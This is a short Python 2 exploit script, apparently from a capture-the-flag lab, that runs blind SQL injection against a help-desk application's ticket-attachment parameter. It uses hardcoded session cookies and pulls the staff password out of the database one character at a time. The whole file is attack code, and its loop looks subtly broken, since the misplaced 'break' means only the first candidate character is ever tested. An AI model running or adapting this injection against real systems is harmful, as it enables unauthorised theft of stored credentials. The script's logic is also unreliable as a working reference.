#!/usr/bin/python
from requests import get
import string
cookies = {'lang': 'english',
           'PHPSESSID': '6ec5sd49m2hqd2l6f5d0anu3g2',
           'usrhash':
'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BHDu89nyBt7elyC8vIIYgpCcpqa%2BUhLVh9kcZWIcDfKPw=='}

url = 'http://10.10.10.121/support/?v='
chars = list(string.ascii_lowercase) + list(string.digits)
password = []
k = 1
while k <= 40:
    for i in chars:
        payload = url + "view_tickets&action=ticket&param[]=9&param[]=attachment&param[]=2&param[]= 11 and substr((select password from staff limit 0,1),{},1) = '{}'---".format(k,i)
        resp = get(payload, cookies=cookies)
        if '404' not in resp.content:
            password.append(i)
            print 'Password: ' + ''.join(password)
            k = k + 1
        break
